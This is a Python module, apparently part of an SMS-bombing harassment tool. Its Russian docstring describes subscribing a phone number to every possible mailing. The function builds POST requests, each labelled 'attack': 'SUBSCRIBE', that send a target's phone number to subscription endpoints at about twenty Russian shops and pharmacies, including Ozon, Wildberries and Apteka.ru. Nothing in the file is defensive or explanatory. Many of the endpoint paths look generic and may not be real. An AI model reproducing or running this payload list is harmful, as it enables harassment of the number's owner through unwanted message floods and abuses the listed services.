"""
Тишина — подписка номера на все возможные рассылки:
- SMS-рассылки магазинов
- Уведомления о акциях
- Каталоги и новости
"""
def subscribe_urls(number):
    return [
        # DNS — подписка на новости
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'DNS-Shop.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.dns-shop.ru/actions/subscribe/',
            'data': {'phone': number, 'agree': 'Y'},
        },
        # MVideo — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'MVideo.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.mvideo.ru/personal/subscribe',
            'data': {'phone': number},
        },
        # Eldorado — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Eldorado.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.eldorado.ru/subscribe/',
            'data': {'phone': number},
        },
        # Citilink — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Citilink.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.citilink.ru/personal/subscribe/',
            'data': {'phone': number},
        },
        # Ozon — подписка на акции
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Ozon.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.ozon.ru/api/subscribe',
            'data': {'phone': number},
        },
        # Wildberries — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Wildberries.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.wildberries.ru/services/subscribe',
            'data': {'phone': number},
        },
        # Лента — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Lenta.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://lenta.com/api/v1/subscribe',
            'data': {'phone': number},
        },
        # Пятёрочка — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': '5ka.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://5ka.ru/api/subscribe',
            'data': {'phone': number},
        },
        # Магнит — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Magnit.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://magnit.ru/subscribe/',
            'data': {'phone': number},
        },
        # Аптека.ru — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Apteka.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://apteka.ru/subscribe/',
            'data': {'phone': number},
        },
        # Еаптека — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Eapteka.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://eapteka.ru/subscribe/',
            'data': {'phone': number},
        },
        # ЗдравСити — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'ZdravCity.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://zdravcity.ru/subscribe/',
            'data': {'phone': number},
        },
        # Технопарк — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Technopark.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://technopark.ru/subscribe/',
            'data': {'phone': number},
        },
        # Sokolov — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Sokolov.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://sokolov.ru/subscribe/',
            'data': {'phone': number},
        },
        # SUNLIGHT — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Sunlight.net', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://sunlight.net/subscribe/',
            'data': {'phone': number},
        },
        # 585Gold — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': '585Gold.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://585gold.ru/subscribe/',
            'data': {'phone': number},
        },
        # Adidas — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Adidas.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.adidas.ru/subscribe/',
            'data': {'phone': number},
        },
        # Nike — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Nike.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.nike.ru/subscribe/',
            'data': {'phone': number},
        },
        # Lamoda — подписка
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'Lamoda.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.lamoda.ru/subscribe/',
            'data': {'phone': number},
        },
        # Wildberries — оповещения о снижении цены
        {
            'info': {'country': 'RU', 'attack': 'SUBSCRIBE', 'website': 'WB-PriceDrop', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.wildberries.ru/services/price-drop',
            'data': {'phone': number},
        },
    ]
